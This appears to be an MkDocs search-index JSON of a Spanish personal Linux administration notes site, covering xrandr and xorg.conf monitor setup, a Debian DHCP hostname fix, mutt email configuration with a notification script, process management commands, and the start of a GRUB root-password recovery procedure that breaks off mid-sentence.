{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Apuntes Jorgepastorr Esta es una p\u00e1gina donde voy guardando mis apuntes para tener un acceso r\u00e1pido. Se puede encontrar informaci\u00f3n variada, en muchos casos solo pinceladas del tema. Se ha creado para uso personal y si le sirve de alluda a alguien perfecto, sino. \u00a1San google lo sabe todo!","title":"Apuntes Jorgepastorr"},{"location":"#apuntes-jorgepastorr","text":"Esta es una p\u00e1gina donde voy guardando mis apuntes para tener un acceso r\u00e1pido. Se puede encontrar informaci\u00f3n variada, en muchos casos solo pinceladas del tema. Se ha creado para uso personal y si le sirve de alluda a alguien perfecto, sino. \u00a1San google lo sabe todo!","title":"Apuntes Jorgepastorr"},{"location":"administracion/Configurar_pantallas_manualmente/","text":"Configurar pantallas manualmente En este post esplico como configurar manualmente de forma temporal con el comando xrand y permanente con el archivo xorg.conf . En un mundo perfecto conectas un dispositivo y descargas los controladores funciona correctamente al 100%, pero en la mitad de las ocasiones eso no es as\u00ed. En la realidad conectas dos pantallas, coge las resoluciones que le parece o detecta, y se lio a configurar posiciones y resoluciones manualmente. En mi caso se jodio todo al no detectar todas la resoluciones del monitor con salida VGA y ademas no poder instalar el control center de AMD por incompativilidad de la version de Xserver. Puesta en escena del entorno: +--------------+ +---------------+ | VGA | | HDMI | | Primer | | segundo | | monitor | | monitor | | 1920x1080 | | 1920x1080 | +------------+-+ +-+------------+ | ---- | | | | ---- | +----+ | | +----+ | | | | +-------+ | | | +--+ | | | | | | | | +--+ | | | | | | | | PC | | | | +-+ | | +------------+ +-------+ Configuraci\u00f3n temporal xrandr es un comando muy potente en cuanto a personalizaci\u00f3n de pantallas y googlendo y biendo manuales es intuitivo de configurar con el. En un inicio no me detectava la resolucion 1920x1080 en el VGA como se ve debajo. \u279c ~ xrandr Screen 0 : minimum 320 x 200 , current 3840 x 1080 , maximum 8192 x 8192 HDMI-0 connected primary 1920x1080+1920+0 ( normal left inverted right x axis y axis ) 160mm x 90mm 1920x1080i 60 .00 + 50 .00 59 .94* 1366x768 60 .00 + 1400x1050 59 .98 1280x1024 60 .02 1440x900 59 .89 1280x960 60 .00 1152x864 74 .82 1280x768 59 .87 1280x720 60 .00 50 .00 59 .94 1024x768 75 .03 70 .07 60 .00 800x600 72 .19 75 .00 60 .32 56 .25 720x576 50 .00 720x576i 50 .00 720x480 60 .00 59 .94 720x480i 60 .00 59 .94 640x480 75 .00 60 .00 59 .94 DVI-0 disconnected ( normal left inverted right x axis y axis ) VGA-0 connected 1024x768+0+0 ( normal left inverted right x axis y axis ) 0mm x 0mm 1024x768 60 .00 800x600 60 .32 56 .25 848x480 60 .00 640x480 59 .94 As\u00ed que empiezo a poner a mi gusto la configuraci\u00f3n. Miro ncon el comando cvt los parametros para a\u00f1adir una resolucion 1920x1080 60Hz. \u279c ~ cvt 1920 1080 60 Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync Una vez tengo los parametros sigo con el lio. # Creo una nueva resoluci\u00f3n xrandr --newmode \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync # la a\u00f1ado a las opciones de la pantalla VGA xrandr --addmode VGA-0 1920x1080_60.00 # Pongo la resolucion en la pantalla VGA xrandr --output VGA-0 --mode 1920x1080_60.00 # Pongo la pantalla VGA primaria xrandr --output VGA-0 --primary # Pongo la pantalla HDMI a 1920x1080 y ademas la coloco a la dereha de la VGA xrandr --output HDMI-0 --mode 1920x1080i --right-of VGA-0 Esto esta muy bien pero al reiniciar el ordenador se va todo a la mierda. Configuraci\u00f3n permanente Para configurar las pantallas de forma permanente nos tenemos que pelear con el tedioso archivo xorg.conf. En el caso que el archivo no se encuentre en la ruta /etc/X11/xorg.conf tendremos que generarlo. Generar archivo xorg.conf Tenemos apagar todo el modo gr\u00e1fico para despues generarlo. # volamos al modo headles sudo init 3 # generamos archivo sudo X -configure El siguiente comando genera el archivo de prueva en /root/xorg.conf.new He generado el archivo para tener una guia de la sintaxis y ver con que nombre identifica el pc a la targeta gr\u00e1fica y su driver, todo lo demas lo e borrado como se ve en el ejemplo mas abajo. Genero los parametros para una resoluci\u00f3n 1920x1080 60Hz. \u279c ~ cvt 1920 1080 60 Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync Ejemplo archivo xorg.conf . En la siguiente configuraci\u00f3n: VGA Creo una resoluci\u00f3n 1920x1080 60Hz . Pantalla por defecto Primaria. HDMI modo resolucion 1920x1080. coloco a la derecha de monitor VGA. /etc/X11/xorg.conf Section \"Device\" Identifier \"Card0\" Driver \"radeon\" BusID \"PCI:1:0:0\" # a\u00f1ado un alias para tabajar mas claramente Option \"monitor-VGA-0\" \"lg\" Option \"monitor-HDMI-0\" \"tv\" EndSection Section \"Monitor\" Identifier \"lg\" # creo a\u00f1ado resolucion para esta pantalla Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync EndSection Section \"Monitor\" Identifier \"tv\" # selecciono resoluci\u00f3n existente para monitor tv Option \"PreferredMode\" \"1920x1080i\" # coloco monitor a la derecha Option \"RightOf\" \"lg\" EndSection # declaro monitor lg como primario Section \"Screen\" Identifier \"Default Screen\" Monitor \"lg\" DefaultDepth 24 SubSection \"Display\" Depth 24 Virtual 3840 1080 EndSubSection Device \"Card0\" EndSection # declaro monitor secundario Section \"Screen\" Identifier \"Screen1\" Monitor \"tv\" DefaultDepth 24 SubSection \"Display\" Depth 24 Virtual 3840 1080 EndSubSection Device \"Card0\" EndSection Una vez a\u00f1adido los parametros toca colocar el archivo en su ruta, reiniciar y tener fe en que funcione. Es posible que a la primera no atines todos los parametros y tengas que hacer varias pruebas. Si pones alg\u00fan parametro que no le gusta, es posible que no arranque el modo gr\u00e1fico y no pases del login. Modifica de nuevo el archivo hasta que atines con la configuraci\u00f3n adecuada. Cada vez que quieras probar una configuraci\u00f3n toca reiniciar.","title":"Configurar pantallas manualmente"},{"location":"administracion/Configurar_pantallas_manualmente/#configurar-pantallas-manualmente","text":"En este post esplico como configurar manualmente de forma temporal con el comando xrand y permanente con el archivo xorg.conf . En un mundo perfecto conectas un dispositivo y descargas los controladores funciona correctamente al 100%, pero en la mitad de las ocasiones eso no es as\u00ed. En la realidad conectas dos pantallas, coge las resoluciones que le parece o detecta, y se lio a configurar posiciones y resoluciones manualmente. En mi caso se jodio todo al no detectar todas la resoluciones del monitor con salida VGA y ademas no poder instalar el control center de AMD por incompativilidad de la version de Xserver. Puesta en escena del entorno: +--------------+ +---------------+ | VGA | | HDMI | | Primer | | segundo | | monitor | | monitor | | 1920x1080 | | 1920x1080 | +------------+-+ +-+------------+ | ---- | | | | ---- | +----+ | | +----+ | | | | +-------+ | | | +--+ | | | | | | | | +--+ | | | | | | | | PC | | | | +-+ | | +------------+ +-------+","title":"Configurar pantallas manualmente"},{"location":"administracion/Configurar_pantallas_manualmente/#configuracion-temporal","text":"xrandr es un comando muy potente en cuanto a personalizaci\u00f3n de pantallas y googlendo y biendo manuales es intuitivo de configurar con el. En un inicio no me detectava la resolucion 1920x1080 en el VGA como se ve debajo. \u279c ~ xrandr Screen 0 : minimum 320 x 200 , current 3840 x 1080 , maximum 8192 x 8192 HDMI-0 connected primary 1920x1080+1920+0 ( normal left inverted right x axis y axis ) 160mm x 90mm 1920x1080i 60 .00 + 50 .00 59 .94* 1366x768 60 .00 + 1400x1050 59 .98 1280x1024 60 .02 1440x900 59 .89 1280x960 60 .00 1152x864 74 .82 1280x768 59 .87 1280x720 60 .00 50 .00 59 .94 1024x768 75 .03 70 .07 60 .00 800x600 72 .19 75 .00 60 .32 56 .25 720x576 50 .00 720x576i 50 .00 720x480 60 .00 59 .94 720x480i 60 .00 59 .94 640x480 75 .00 60 .00 59 .94 DVI-0 disconnected ( normal left inverted right x axis y axis ) VGA-0 connected 1024x768+0+0 ( normal left inverted right x axis y axis ) 0mm x 0mm 1024x768 60 .00 800x600 60 .32 56 .25 848x480 60 .00 640x480 59 .94 As\u00ed que empiezo a poner a mi gusto la configuraci\u00f3n. Miro ncon el comando cvt los parametros para a\u00f1adir una resolucion 1920x1080 60Hz. \u279c ~ cvt 1920 1080 60 Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync Una vez tengo los parametros sigo con el lio. # Creo una nueva resoluci\u00f3n xrandr --newmode \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync # la a\u00f1ado a las opciones de la pantalla VGA xrandr --addmode VGA-0 1920x1080_60.00 # Pongo la resolucion en la pantalla VGA xrandr --output VGA-0 --mode 1920x1080_60.00 # Pongo la pantalla VGA primaria xrandr --output VGA-0 --primary # Pongo la pantalla HDMI a 1920x1080 y ademas la coloco a la dereha de la VGA xrandr --output HDMI-0 --mode 1920x1080i --right-of VGA-0 Esto esta muy bien pero al reiniciar el ordenador se va todo a la mierda.","title":"Configuraci\u00f3n temporal"},{"location":"administracion/Configurar_pantallas_manualmente/#configuracion-permanente","text":"Para configurar las pantallas de forma permanente nos tenemos que pelear con el tedioso archivo xorg.conf. En el caso que el archivo no se encuentre en la ruta /etc/X11/xorg.conf tendremos que generarlo.","title":"Configuraci\u00f3n permanente"},{"location":"administracion/Configurar_pantallas_manualmente/#generar-archivo-xorgconf","text":"Tenemos apagar todo el modo gr\u00e1fico para despues generarlo. # volamos al modo headles sudo init 3 # generamos archivo sudo X -configure El siguiente comando genera el archivo de prueva en /root/xorg.conf.new He generado el archivo para tener una guia de la sintaxis y ver con que nombre identifica el pc a la targeta gr\u00e1fica y su driver, todo lo demas lo e borrado como se ve en el ejemplo mas abajo. Genero los parametros para una resoluci\u00f3n 1920x1080 60Hz. \u279c ~ cvt 1920 1080 60 Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync Ejemplo archivo xorg.conf . En la siguiente configuraci\u00f3n: VGA Creo una resoluci\u00f3n 1920x1080 60Hz . Pantalla por defecto Primaria. HDMI modo resolucion 1920x1080. coloco a la derecha de monitor VGA. /etc/X11/xorg.conf Section \"Device\" Identifier \"Card0\" Driver \"radeon\" BusID \"PCI:1:0:0\" # a\u00f1ado un alias para tabajar mas claramente Option \"monitor-VGA-0\" \"lg\" Option \"monitor-HDMI-0\" \"tv\" EndSection Section \"Monitor\" Identifier \"lg\" # creo a\u00f1ado resolucion para esta pantalla Modeline \"1920x1080_60.00\" 173 .00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync EndSection Section \"Monitor\" Identifier \"tv\" # selecciono resoluci\u00f3n existente para monitor tv Option \"PreferredMode\" \"1920x1080i\" # coloco monitor a la derecha Option \"RightOf\" \"lg\" EndSection # declaro monitor lg como primario Section \"Screen\" Identifier \"Default Screen\" Monitor \"lg\" DefaultDepth 24 SubSection \"Display\" Depth 24 Virtual 3840 1080 EndSubSection Device \"Card0\" EndSection # declaro monitor secundario Section \"Screen\" Identifier \"Screen1\" Monitor \"tv\" DefaultDepth 24 SubSection \"Display\" Depth 24 Virtual 3840 1080 EndSubSection Device \"Card0\" EndSection Una vez a\u00f1adido los parametros toca colocar el archivo en su ruta, reiniciar y tener fe en que funcione. Es posible que a la primera no atines todos los parametros y tengas que hacer varias pruebas. Si pones alg\u00fan parametro que no le gusta, es posible que no arranque el modo gr\u00e1fico y no pases del login. Modifica de nuevo el archivo hasta que atines con la configuraci\u00f3n adecuada. Cada vez que quieras probar una configuraci\u00f3n toca reiniciar.","title":"Generar archivo xorg.conf"},{"location":"administracion/Debian_hostname_dinamico/","text":"Debian hostname dinamico https://blog.schlomo.schapiro.org/2013/11/setting-hostname-from-dhcp-in-debian.html Al parecer debian y ubuntu llevan un tiempo con un peque\u00f1o bug, que al hacer la resoluci\u00f3n del hostname mediante dhcp, no la resuelve bien. Indagando por internet hay diferentes soluciones y e escogido la que menos agresiva/guarrada me a parecido, en dos sencillos pasos arreglas el problema. 1. A\u00f1adir localhost por defecto echo localhost | tee /etc/hostname 2. Soluci\u00f3n para el dhclient-script roto El dhclient-script tiene (IMHO) un error: si hay un antiguo arrendamiento DHCP con un nombre de host en la base de datos de arrendamiento (por ejemplo, en /var/lib/dhcp/dhclient.eth0.leases), entonces el script no establecer\u00e1 el nombre de host desde DHCP incluso si el nombre del sistema sigue siendo localhost. Para evitar este error, simplemente cree un gancho de entrada dhclient para anular la variable de nombre de host anterior: echo unset old_host_name | sudo tee /etc/dhcp/dhclient-enter-hooks.d/unset_old_hostname","title":"Debian hostname dinamico"},{"location":"administracion/Debian_hostname_dinamico/#debian-hostname-dinamico","text":"https://blog.schlomo.schapiro.org/2013/11/setting-hostname-from-dhcp-in-debian.html Al parecer debian y ubuntu llevan un tiempo con un peque\u00f1o bug, que al hacer la resoluci\u00f3n del hostname mediante dhcp, no la resuelve bien. Indagando por internet hay diferentes soluciones y e escogido la que menos agresiva/guarrada me a parecido, en dos sencillos pasos arreglas el problema.","title":"Debian hostname dinamico"},{"location":"administracion/Debian_hostname_dinamico/#1-anadir-localhost-por-defecto","text":"echo localhost | tee /etc/hostname","title":"1. A\u00f1adir localhost por defecto"},{"location":"administracion/Debian_hostname_dinamico/#2-solucion-para-el-dhclient-script-roto","text":"El dhclient-script tiene (IMHO) un error: si hay un antiguo arrendamiento DHCP con un nombre de host en la base de datos de arrendamiento (por ejemplo, en /var/lib/dhcp/dhclient.eth0.leases), entonces el script no establecer\u00e1 el nombre de host desde DHCP incluso si el nombre del sistema sigue siendo localhost. Para evitar este error, simplemente cree un gancho de entrada dhclient para anular la variable de nombre de host anterior: echo unset old_host_name | sudo tee /etc/dhcp/dhclient-enter-hooks.d/unset_old_hostname","title":"2. Soluci\u00f3n para el dhclient-script roto"},{"location":"administracion/Mutt/","text":"Que es mutt? mutt es un programa pra enviar correos desde terminal, en el siguiente ejemplo lo usare para notificar a diversos usuarios que se elimina su cuenta. Install mutt CentOS sudo yum install mutt Ubuntu sudo apt-get install mutt Configure Mutt Create mkdir -p ~/.mutt/cache/headers mkdir ~/.mutt/cache/bodies touch ~/.mutt/certificates Create mutt configuration file muttrc touch ~/.mutt/muttrc Open muttrc vim ~/.mutt/muttrc set ssl_starttls = yes set ssl_force_tls = yes set imap_user = 'jorge@gmail.com' set imap_pass = '(123456789)' set from = 'jorge@gmail.com' set realname = 'Jorge ' set folder = imaps://imap.gmail.com/ set spoolfile = imaps://imap.gmail.com/INBOX set postponed = \"imaps://imap.gmail.com/[Gmail]/Drafts\" set header_cache = \"~/.mutt/cache/headers\" set message_cachedir = \"~/.mutt/cache/bodies\" set certificate_file = \"~/.mutt/certificates\" set smtp_url = 'smtps://jorge@smtp.gmail.com:465/' set smtp_pass = \"(123456789)\" set move = no set imap_keepalive = 900 script El siguiente escript cogera una lista de correos de un fihero y les enviara una nottificaci\u00f3n fichero de correos a enviar: correos.txt ism477@correu.org ism238@correu.org ism587@correu.org script-correo.sh #!/bin/bash ism = ` cat correos.txt | sed -r 's/^([^@]*)@.*/\\1/' ` vueltas = ` cat correos.txt | wc -l ` correo = ` cat correos.txt ` lista_ism =() lista_correos =() # a\u00f1ado a una lista los usuarios de correo.txt cont = 0 for i in $ism ; do lista_ism [ $cont ]= $i let cont += 1 done # a\u00f1ado a una lista los correos de correo.txt cont = 0 for i in $correo ; do lista_correos [ $cont ]= $i let cont += 1 done # mando email masivo cont = 0 for i in ` seq 1 $vueltas ` ; do echo \"Se comunica que al usuario ${ lista_ism [ $cont ] } se borrara su cuenta\" | mutt -s 'borrado usuario' ${ lista_correos [ $cont ] } let cont += 1 done","title":"Que es mutt?"},{"location":"administracion/Mutt/#que-es-mutt","text":"mutt es un programa pra enviar correos desde terminal, en el siguiente ejemplo lo usare para notificar a diversos usuarios que se elimina su cuenta.","title":"Que es mutt?"},{"location":"administracion/Mutt/#install-mutt","text":"CentOS sudo yum install mutt Ubuntu sudo apt-get install mutt","title":"Install mutt"},{"location":"administracion/Mutt/#configure-mutt","text":"Create mkdir -p ~/.mutt/cache/headers mkdir ~/.mutt/cache/bodies touch ~/.mutt/certificates Create mutt configuration file muttrc touch ~/.mutt/muttrc Open muttrc vim ~/.mutt/muttrc set ssl_starttls = yes set ssl_force_tls = yes set imap_user = 'jorge@gmail.com' set imap_pass = '(123456789)' set from = 'jorge@gmail.com' set realname = 'Jorge ' set folder = imaps://imap.gmail.com/ set spoolfile = imaps://imap.gmail.com/INBOX set postponed = \"imaps://imap.gmail.com/[Gmail]/Drafts\" set header_cache = \"~/.mutt/cache/headers\" set message_cachedir = \"~/.mutt/cache/bodies\" set certificate_file = \"~/.mutt/certificates\" set smtp_url = 'smtps://jorge@smtp.gmail.com:465/' set smtp_pass = \"(123456789)\" set move = no set imap_keepalive = 900","title":"Configure Mutt"},{"location":"administracion/Mutt/#script","text":"El siguiente escript cogera una lista de correos de un fihero y les enviara una nottificaci\u00f3n fichero de correos a enviar: correos.txt ism477@correu.org ism238@correu.org ism587@correu.org script-correo.sh #!/bin/bash ism = ` cat correos.txt | sed -r 's/^([^@]*)@.*/\\1/' ` vueltas = ` cat correos.txt | wc -l ` correo = ` cat correos.txt ` lista_ism =() lista_correos =() # a\u00f1ado a una lista los usuarios de correo.txt cont = 0 for i in $ism ; do lista_ism [ $cont ]= $i let cont += 1 done # a\u00f1ado a una lista los correos de correo.txt cont = 0 for i in $correo ; do lista_correos [ $cont ]= $i let cont += 1 done # mando email masivo cont = 0 for i in ` seq 1 $vueltas ` ; do echo \"Se comunica que al usuario ${ lista_ism [ $cont ] } se borrara su cuenta\" | mutt -s 'borrado usuario' ${ lista_correos [ $cont ] } let cont += 1 done","title":"script"},{"location":"administracion/Procesos/","text":"Procesos Todo proceso tiene un PID ( ID del proceso ) PPID padre del proceso Los procesos se ejecutan en orden gerarquico. \u25a0 ps -l F S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD 0 S 101377 1627 1185 0 80 0 - 32936 - pts/2 00 :00:00 bash 0 S 101377 1668 1627 0 80 0 - 41373 - pts/2 00 :00:00 zsh 0 R 101377 1858 1668 0 80 0 - 35775 - pts/2 00 :00:00 ps \u25a0 ps PID TTY TIME CMD 1627 pts/2 00 :00:00 bash 1668 pts/2 00 :00:00 zsh 1863 pts/2 00 :00:00 ps ps tiene como padre zsh zsh tiene como padre bash \u00c1rbol de procesos pstree -ps <num proceso> -p proceso -s arbol -a mostrar todo sin agrupaciones ps -u mi usuario -a all e toria -ax parta ver todos x para ver del sistema Proceso numero 1 es el systemd ( initd ) padre de todos los procesos Los procesos que empiezan por K son del kernel Ver identificadores de los procesos bash pgrep -l bash # veo numero de proceso y proceso pidof bash Matar procesos kill envia se\u00f1ales, las se\u00f1ales se envian entre procesos pkill -l lista los diferentes tipos de se\u00f1ales disponibles 15 SIGTERM ( se\u00f1al terminar procesos, es la se\u00f1al por defecto de kill) 9 SIGKILL ( se\u00f1al matar ) Solo si se queda colgado, puedes perder informaci\u00f3n al matar a lo bestia. kill <numero proceso> killall <nombre proceso> pkill <nombre proceso> killall -u user1 # matar todos los procesos de un usuario especifico kill %2 # matar segundo proceso de backgroud xkill ( clicar con el cursor encima ventana ) Backgroud/Foregraund Background ejecutar ordenes en segundo plano con & al final de la orden. Ejemplo: $ sleep 154856 & jobs ver procesos en segundo plano \u25a0 prova jobs [ 1 ] running tree / & > /dev/null [ 2 ] - running sleep 145879 [ 3 ] + running sleep 145879 signo + indica el ultimo proceso. signo - indica el pen\u00faltimo proceso. [1] n\u00famero de proceso en background. Jobs esta asociado a una sesion de trabajo La orden que esta en background no tiene que generar salida en stdout ni stderr, porque al mostrar por la terminal el resultado te molesta en la ejecuci\u00f3n de los siguientes comandos. Los programas que est\u00e1n en background no pueden utilizar stdin Para traer de foregraund a background fg %2 n\u00famero de proceso si quieres luego que vuelva a backgroud Ctrl Z y se muestra como stopped y se pueden reanudar ( poner en running ) con bg . Otra manera de parar un proceso en background es con la se\u00f1al stoped SIGSTOP kill -19 %5 Ejemplo: # creo tres procesos en backgroud debian \u279c sleep 12345678 & [ 1 ] 1886 debian \u279c sleep 12345678 & [ 2 ] 1895 debian \u279c sleep 5555555 & [ 3 ] 1967 # compruebo debian \u279c jobs [ 1 ] running sleep 12345678 [ 2 ] - running sleep 12345678 [ 3 ] + running sleep 5555555 # traigo a forgraund el proceso 3 debian \u279c fg %3 [ 3 ] - 1967 running sleep 5555555 # lo vuelvo a mandar a background con Ctrl Z ^Z [ 3 ] + 1967 suspended sleep 5555555 # Al mandarlo a background se suspende debian jobs [ 1 ] running sleep 12345678 [ 2 ] - running sleep 12345678 [ 3 ] + suspended sleep 5555555 # reactivo el proceso debian \u279c bg %3 [ 3 ] - 1967 continued sleep 5555555 debian \u279c curs git: ( master ) \u2717 jobs [ 1 ] running sleep 12345678 [ 2 ] + running sleep 12345678 [ 3 ] - running sleep 5555555 bacgkround des-asociado Para realizar un proceso y des-asociarlo de nuestra sesi\u00f3n se puede utilizar nohup , este comando te permite lanzar un comando des-asociado y as\u00ed poder cerrar tu sesi\u00f3n, que el comando seguir\u00e1 ejecut\u00e1ndose hasta que acabe o apagues el pc. \u00datil para backups Obviamente el comando no puede tener stdout ni stderr nohup du -h / > du.txt 2> /dev/null & debian \u279c nohup sleep 1547857 & [ 1 ] 7033 nohup: se descarta la entrada y se a\u00f1ade la salida a 'nohup.out' # una vez cerrada la sesi\u00f3n y avierta otra debian \u279c ps ax | grep sleep 7033 ? SN 0 :00 sleep 1547857 Con disown podemos des-asociar un proceso que este en background. disown -a # todos los procesos en backgroud disown %3 # proceso especifico debian \u279c ps ax | grep sleep 1886 pts/1 SN 0 :00 sleep 12345678 1895 pts/1 SN 0 :00 sleep 12345678 1967 pts/1 SN 0 :00 sleep 5555555 debian \u279c disown %3 # cierro y abro otra sesi\u00f3n debian \u279c ps ax | grep sleep 1967 ? SN 0 :00 sleep 5555555 uptime Muestra la hora y el tiempo que est\u00e1 encendida la m\u00e1quina, cuantos usuarios conectados y el promedio de uso de la cpu ( un promedio de rendimiento) Top Nos muestra los procesos que hay en marcha Atributos del top top -p < n\u00famero de identificador del proceso > muestra s\u00f3lo esa l\u00ednea top -d < se refresca cada n\u00famero de segundos que introduzcas > top -n < sale del top al actualizar el n\u00famero de veces que le has indicado.> Dentro del top tiene otros atributos. p \u2192 ordena por cpu m \u2192 ordena por memoria shit + L \u2192 filtra por lo que escribas Tambi\u00e9n tenemos la opci\u00f3n de htop B\u00e1sicamente es lo mismo pero m\u00e1s claro y con ciertas opciones en la parte inferior como matar procesos, subir o bajar prioridad, filtrados, etc\u2026 iotop \u2192 lista procesos y transferencia de Bytes que escribe o lee en la cpu Prioridades Las prioridades son la importancia que le da el kernel a los procesos para ejecutarse. Nos es \u00fatil si queremos que un programa vaya m\u00e1s o menos r\u00e1pido seg\u00fan el momento. La prioridad va de: M\u00e1xima -20 M\u00ednima +19 Por defecto 0 Formas de cambiar prioridades. nice nos permite cambiar prioridades mediante un comando y si queremos renombrar la prioridad utilizaremos renice nice -n <N\u00baPrioridad> -p <proceso> htop tambi\u00e9n nos permite cambiar prioridades con las opciones inferiores nice+F8 y nice-F7 Modo gr\u00e1fico tenemos monitor de sistema, te muestra los procesos gr\u00e1ficamente","title":"Procesos"},{"location":"administracion/Procesos/#procesos","text":"Todo proceso tiene un PID ( ID del proceso ) PPID padre del proceso Los procesos se ejecutan en orden gerarquico. \u25a0 ps -l F S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD 0 S 101377 1627 1185 0 80 0 - 32936 - pts/2 00 :00:00 bash 0 S 101377 1668 1627 0 80 0 - 41373 - pts/2 00 :00:00 zsh 0 R 101377 1858 1668 0 80 0 - 35775 - pts/2 00 :00:00 ps \u25a0 ps PID TTY TIME CMD 1627 pts/2 00 :00:00 bash 1668 pts/2 00 :00:00 zsh 1863 pts/2 00 :00:00 ps ps tiene como padre zsh zsh tiene como padre bash \u00c1rbol de procesos pstree -ps <num proceso> -p proceso -s arbol -a mostrar todo sin agrupaciones ps -u mi usuario -a all e toria -ax parta ver todos x para ver del sistema Proceso numero 1 es el systemd ( initd ) padre de todos los procesos Los procesos que empiezan por K son del kernel Ver identificadores de los procesos bash pgrep -l bash # veo numero de proceso y proceso pidof bash","title":"Procesos"},{"location":"administracion/Procesos/#matar-procesos","text":"kill envia se\u00f1ales, las se\u00f1ales se envian entre procesos pkill -l lista los diferentes tipos de se\u00f1ales disponibles 15 SIGTERM ( se\u00f1al terminar procesos, es la se\u00f1al por defecto de kill) 9 SIGKILL ( se\u00f1al matar ) Solo si se queda colgado, puedes perder informaci\u00f3n al matar a lo bestia. kill <numero proceso> killall <nombre proceso> pkill <nombre proceso> killall -u user1 # matar todos los procesos de un usuario especifico kill %2 # matar segundo proceso de backgroud xkill ( clicar con el cursor encima ventana )","title":"Matar procesos"},{"location":"administracion/Procesos/#backgroudforegraund","text":"Background ejecutar ordenes en segundo plano con & al final de la orden. Ejemplo: $ sleep 154856 & jobs ver procesos en segundo plano \u25a0 prova jobs [ 1 ] running tree / & > /dev/null [ 2 ] - running sleep 145879 [ 3 ] + running sleep 145879 signo + indica el ultimo proceso. signo - indica el pen\u00faltimo proceso. [1] n\u00famero de proceso en background. Jobs esta asociado a una sesion de trabajo La orden que esta en background no tiene que generar salida en stdout ni stderr, porque al mostrar por la terminal el resultado te molesta en la ejecuci\u00f3n de los siguientes comandos. Los programas que est\u00e1n en background no pueden utilizar stdin Para traer de foregraund a background fg %2 n\u00famero de proceso si quieres luego que vuelva a backgroud Ctrl Z y se muestra como stopped y se pueden reanudar ( poner en running ) con bg . Otra manera de parar un proceso en background es con la se\u00f1al stoped SIGSTOP kill -19 %5 Ejemplo: # creo tres procesos en backgroud debian \u279c sleep 12345678 & [ 1 ] 1886 debian \u279c sleep 12345678 & [ 2 ] 1895 debian \u279c sleep 5555555 & [ 3 ] 1967 # compruebo debian \u279c jobs [ 1 ] running sleep 12345678 [ 2 ] - running sleep 12345678 [ 3 ] + running sleep 5555555 # traigo a forgraund el proceso 3 debian \u279c fg %3 [ 3 ] - 1967 running sleep 5555555 # lo vuelvo a mandar a background con Ctrl Z ^Z [ 3 ] + 1967 suspended sleep 5555555 # Al mandarlo a background se suspende debian jobs [ 1 ] running sleep 12345678 [ 2 ] - running sleep 12345678 [ 3 ] + suspended sleep 5555555 # reactivo el proceso debian \u279c bg %3 [ 3 ] - 1967 continued sleep 5555555 debian \u279c curs git: ( master ) \u2717 jobs [ 1 ] running sleep 12345678 [ 2 ] + running sleep 12345678 [ 3 ] - running sleep 5555555","title":"Backgroud/Foregraund"},{"location":"administracion/Procesos/#bacgkround-des-asociado","text":"Para realizar un proceso y des-asociarlo de nuestra sesi\u00f3n se puede utilizar nohup , este comando te permite lanzar un comando des-asociado y as\u00ed poder cerrar tu sesi\u00f3n, que el comando seguir\u00e1 ejecut\u00e1ndose hasta que acabe o apagues el pc. \u00datil para backups Obviamente el comando no puede tener stdout ni stderr nohup du -h / > du.txt 2> /dev/null & debian \u279c nohup sleep 1547857 & [ 1 ] 7033 nohup: se descarta la entrada y se a\u00f1ade la salida a 'nohup.out' # una vez cerrada la sesi\u00f3n y avierta otra debian \u279c ps ax | grep sleep 7033 ? SN 0 :00 sleep 1547857 Con disown podemos des-asociar un proceso que este en background. disown -a # todos los procesos en backgroud disown %3 # proceso especifico debian \u279c ps ax | grep sleep 1886 pts/1 SN 0 :00 sleep 12345678 1895 pts/1 SN 0 :00 sleep 12345678 1967 pts/1 SN 0 :00 sleep 5555555 debian \u279c disown %3 # cierro y abro otra sesi\u00f3n debian \u279c ps ax | grep sleep 1967 ? SN 0 :00 sleep 5555555","title":"bacgkround des-asociado"},{"location":"administracion/Procesos/#uptime","text":"Muestra la hora y el tiempo que est\u00e1 encendida la m\u00e1quina, cuantos usuarios conectados y el promedio de uso de la cpu ( un promedio de rendimiento)","title":"uptime"},{"location":"administracion/Procesos/#top","text":"Nos muestra los procesos que hay en marcha Atributos del top top -p < n\u00famero de identificador del proceso > muestra s\u00f3lo esa l\u00ednea top -d < se refresca cada n\u00famero de segundos que introduzcas > top -n < sale del top al actualizar el n\u00famero de veces que le has indicado.> Dentro del top tiene otros atributos. p \u2192 ordena por cpu m \u2192 ordena por memoria shit + L \u2192 filtra por lo que escribas Tambi\u00e9n tenemos la opci\u00f3n de htop B\u00e1sicamente es lo mismo pero m\u00e1s claro y con ciertas opciones en la parte inferior como matar procesos, subir o bajar prioridad, filtrados, etc\u2026 iotop \u2192 lista procesos y transferencia de Bytes que escribe o lee en la cpu","title":"Top"},{"location":"administracion/Procesos/#prioridades","text":"Las prioridades son la importancia que le da el kernel a los procesos para ejecutarse. Nos es \u00fatil si queremos que un programa vaya m\u00e1s o menos r\u00e1pido seg\u00fan el momento. La prioridad va de: M\u00e1xima -20 M\u00ednima +19 Por defecto 0 Formas de cambiar prioridades. nice nos permite cambiar prioridades mediante un comando y si queremos renombrar la prioridad utilizaremos renice nice -n <N\u00baPrioridad> -p <proceso> htop tambi\u00e9n nos permite cambiar prioridades con las opciones inferiores nice+F8 y nice-F7 Modo gr\u00e1fico tenemos monitor de sistema, te muestra los procesos gr\u00e1ficamente","title":"Prioridades"},{"location":"administracion/Resetear_la_password_root/","text":"Resetear la password root. Tenemos que iniciar el sistema en modo emergencia y permisos de escritura y lectura. al iniciar el ordenador en la pantalla de grub clicar \u201ce\u201d en la partici\u00f3n deseada. a\u00f1adimos rw init=/bin/bash al final de la l\u00ednea linux16 . una vez dentro cambiar la pasword root con: passwd para evitar fallos con selinux crear 